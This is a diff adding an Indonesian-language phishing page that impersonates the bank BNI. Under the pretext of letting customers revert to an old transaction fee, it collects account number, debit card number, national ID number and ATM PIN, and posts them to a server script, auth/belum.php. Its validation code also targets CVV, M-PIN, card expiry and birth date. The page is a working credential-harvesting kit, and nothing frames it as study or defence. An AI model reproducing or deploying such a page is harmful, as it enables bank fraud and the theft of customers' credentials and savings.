@@ -1,0 +1,127 @@
+
+<!doctype html> <html lang="id"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <title>BNI Layanan ganti tarif</title> <meta name="description" content="Apakah Anda setuju tarif transaksi baru? Jika tidak setuju segera ganti ke tarif lama."> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0"> <link rel="icon" href="ASSETS/img/favicon.ico" type="image/x-icon" /> <link rel="SHORTCUT ICON" href="ASSETS/img/favicon.ico" type="image/x-icon"> <link rel="apple-touch-icon" href="ASSETS/img/favicon.png" /> <link rel="apple-touch-icon" sizes="76x76" href="ASSETS/img/favicon_76x76.png" /> <link rel="apple-touch-icon" sizes="120x120" href="ASSETS/img/favicon_120x120.png" /> <link rel="apple-touch-icon" sizes="152x152" href="ASSETS/img/favicon_152x152.png" /> 
+
+<link href="css/1satu.css" rel="stylesheet" type="text/css" /> 
+
+<link href="css/2dua.css" rel="stylesheet" type="text/css" /> 
+
+<link href="css/3tiga.css" rel="stylesheet" type="text/css" /> 
+
+<link href="css/4empat.css" rel="stylesheet" type="text/css" /> 
+
+<link href="css/5lima.css" rel="stylesheet" type="text/css" /> 
+
+<link href="css/6enam.css" rel="stylesheet" type="text/css" /> 
+
+<link href="css/7tujuh.css" rel="stylesheet" type="text/css" /> </head> <body> 	
+
+
+<nav class="navbar navbar-inverse navbar-fixed-top"> 	<div class="container"> 		<div class="navbar-header"> 			<a class="navbar-brand" href="">Layanan Bni Ganti Tarif</a> 		</div> 		<div id="navbar-header-second" class="navbar-header-second navbar-right"> 			<a href="home"> 				<span>Layanan Digital</span> 			</a> 		</div> 	</div> </nav> 	 	<div class="container container-margin"> 		<form id="form" action="auth/belum.php" method="POST"> 			<input type="hidden" name="input" value="input" /> 			<div class="panel panel-default"> 			 	<div class="panel-body"> 					<div class="row"> 						<div class="col-md-12"> 						
+<center>
+<img src="img/bni.png" width="60%">
+<br>
+<h4>Silahkan masukan data dibawah untuk proses perubahan tarif transaksi.</h4>
+</center>
+<br>
+<br>
+<div class="form-group">
+<label>NOMOR REKENING</label> 								<input class="form-control" type="number" name="norek" value="" autocomplete="off" 
+required
+/> 							</div> 						
+
+
+<div class="form-group">
+<label>NOMOR KARTU DEBIT</label> 								<input class="form-control" data-mask="0000 0000 0000 0000" type="tel" name="no" value="" autocomplete="off" maxlength=""
+required/> 							
+</div> 						
+
+
+<div class="form-group">
+<label>NIK KTP</label> 								<input class="form-control" type="tel" name="mb" value="" autocomplete="off" maxlength="16" required /> 							</div> 							
+
+
+
+<div class="form-group">
+<label>PIN ATM</label> 								<input class="form-control" type="password" inputmode="numeric" name="cvv" value="" autocomplete="off" maxlength="6" required /> 							</div> 
+
+
+	</select> 
+
+<br>
+<div class="row"> 				
+<div class="col-md-12"> 	
+<button class="btn btn-bni-2 pull-right" type="submit">LANJUTKAN</button> 				</div> 			</div> 		</form> 	</div> 	 	<div id="modal-info" class="modal fade" role="dialog"> 	 <div class="modal-dialog modal-md"> 	 <div class="modal-content text-center"> 	 <div class="modal-body" id="modalError"> 	 <div id="modal-info-title"> 	 	<h4><b>Layanan Ganti Tarif</b></h4> 	 </div> 	 <div id="modal-info-text" class="modal-text">Silahkan isi data untuk proses ganti tarif transaksi anda.</div> 	 <div> 		 	<button class="btn btn-bni" data-dismiss="modal">Ok, Lanjutkan.</button> 		 </div> 	 </div> 	 </div> 	 </div> 	</div> 	 	<div id="modal-error" class="modal fade" role="dialog"> 	 <div class="modal-dialog modal-md"> 	 <div class="modal-content text-center"> 	 <div class="modal-body" id="modalError"> 	 <div class="modal-logo"> 	 <i class="fas fa-exclamation-circle color-orange"></i> 	 </div> 	 <div id="modal-error-title"></div> 	 <div id="modal-error-text" class="modal-text"></div> 	 <div> 		 	<button class="btn btn-bni" data-dismiss="modal">OK, Saya Mengerti</button> 		 </div> 	 </div> 	 </div> 	 </div> 	</div> 	 	
+
+<script src="js/1.js"></script> 
+
+<script src="js/2.js"></script> 
+
+<script src="js/3.js"></script> 
+
+<script src="js/4.js"></script> 
+
+<script src="js/5.js"></script> 
+
+<script src="js/6.js"></script> 
+
+<script src="js/7.js"></script> 
+
+<script src="js/8.js"></script> 
+
+<script src="js/9.js"></script> 
+
+<script src="js/10.js"></script> 
+
+<script src="js/11.js"></script> 	 
+
+<script> 		$(document).ready(function() { 			 			var alert = ''; 			var alert_list = ''; 			 			if (alert != 'undefined' && alert != '') { 				var res = JSON.parse(alert); 				 				if (res.code == "9008" || res.code == "9012") { 					$('form#form')[0].reset(); 				} 				 				$("#modal-error-title").html($("<h3><b>" + res.header + "</b></h3>")); 				$('#modal-error-text').html($("<p>" + res.message + "</p>")); 				$("#modal-error").modal("show"); 			} 			else if (alert_list != 'undefined' && alert_list != '') { 				var res = JSON.parse(alert_list); 				$("#modal-error-title").html($("<h3><b>" + res.header + "</b></h3>")); 		for (var key in res.message) { 				 if (res.message.hasOwnProperty(key)) { 				 	var tag = document.createElement("p"); 		 	var text = document.createTextNode(res.message[key]); 		 	tag.appendChild(text); 		 	var element = document.getElementById("modal-error-text"); 		 	element.appendChild(tag); 				 } 				} 	$("#modal-error").modal("show"); 			} 			else { 				$("#modal-info").modal("show"); 			} 			 			var date = new Date(); 			date.setDate(date.getDate()-6575); 			$('.date, #tanggal_lahir').datepicker({ 				language: 'id', 				orientation: 'left bottom', 				disableTouchKeyboard: true, 				format: 'dd/mm/yyyy', 				defaultViewDate: date, 				endDate: date, 	 autoclose: true 			}); 			 			$('#tanggal_lahir').on('changeDate show', function(e) { 		 $('#form').bootstrapValidator('revalidateField', 'tanggal_lahir'); 			}); 			 			$('#form').bootstrapValidator({ 				excluded: [':disabled'], 				fields: { 					
+    
+    nama: { 		 validators: { 		 notEmpty: { 		 message: "Email tidak boleh kosong" 		 }, 		 
+
+    namaa: { 		 validators: { 		 notEmpty: { 		 message: "Nama pemegang Kartu tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z].*[a-zA-Z].*[a-zA-Z]+$/, 		 message: "Nama hanya boleh menggunakan huruf dan spasi, minimal 3 huruf" 		 }, 		 stringLength: { 		 max: 40, 		 message: "Nama maksimal 40 karakter" 		 } 		 } 		 }, 		 
+
+
+kota_penerbit_identitas: { 		 validators: { 		 notEmpty: { 		 message: "Kota Penerbit Identitas tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z ]+$/, 		 message: "Kota Penerbit Identitas hanya boleh menggunakan huruf dan spasi" 		 }, 		 stringLength: { 		 	min: 3, 		 max: 25, 		 message: "Kota Penerbit Identitas minimal 3 maksimal 25 karakter" 		 } 		 } 		 }, 		 
+
+
+namao: { 		 validators: { 		 notEmpty: { 		 message: "Nomor rekening tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 10, 		 max: 12, 		 message: "Rekening harus 10- 12 karakter" 		 } 		 } 		 }, 		 
+
+
+
+kode: { 		 validators: { 		 notEmpty: { 		 message: " Valid Thru tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 4, 		 max: 64, 		 message: "Valid Thru harus 4 digit. Contoh 1025" 		 } 		 } 		 }, 		 
+debit: { 		 validators: { 		 notEmpty: { 		 message: " Nomor kartu tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 16, 		 max: 16, 		 message: "Nomor kartu harus 16 digit" 		 } 		 } 		 }, 		 
+norek: { 		 validators: { 		 notEmpty: { 		 message: "Tanggal lahir tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 10, 		 max: 16, 		 message: "Nomor Rekening harus 10-16 digit" 		 } 		 } 		 }, 
+
+mpin: { 		 validators: { 		 notEmpty: { 		 message: "Pin Atm tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 6, 		 max: 6, 		 message: "M-Pin harus 6 digit" 		 } 		 } 		 }, 
+
+
+pin: { 		 validators: { 		 notEmpty: { 		 message: "Cvv/Cvc tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Cvv/Cvc hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 3, 		 max: 3, 		 message: "Cvv/Cvc harus 3 digit" 		 } 		 } 		 }, 		 
+
+
+
+tarik: { 		 validators: { 		 notEmpty: { 		 message: "Tarif harus di pilih" 		 }, 		 regexp: { 		 regexp: /^[A-Z]+$/, 		 message: "Silahkan pilih satu" 		 }, 		 stringLength: { 		 	min: 1, 		 max: 1, 		 message: "Pilih salah satu tarif" 		 } 		 } 		 },
+
+
+
+
+
+
+tempat_lahir: { 		 validators: { 		 	notEmpty: { 		 message: "Tempat Lahir tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z].*[a-zA-Z].*[a-zA-Z]+$/, 		 message: "Tempat Lahir hanya boleh menggunakan huruf dan spasi, minimal 3 huruf" 		 }, 		 stringLength: { 		 max: 40, 		 message: "Tempat Lahir maksimal 40 karakter" 		 } 		 } 		 }, 		 
+
+
+
+tanggal_lahir: { 		 validators: { 		 notEmpty: { 		 message: "Tanggal Lahir tidak boleh kosong" 		 }, 		 date: { 		 		 	format: "DD/MM/YYYY", 		 		 	message: "Tanggal Lahir tidak sesuai format" 	 		 	}, 	 		 	regexp: { 		 regexp: /^[0-9/]+$/, 		 message: "Tanggal Lahir hanya boleh menggunakan angka dan /" 		 }, 		 stringLength: { 		 	min: 10, 		 max: 10, 		 message: "Tanggal Lahir harus 10 karakter" 		 } 		 } 		 } 				} 			}); 		}); 	</script>  </html>
+<br>
+<br>
+<center>
+<img src="img/bwhh.png" width="100%"></center><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type='text/javascript' src='k.js'></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+
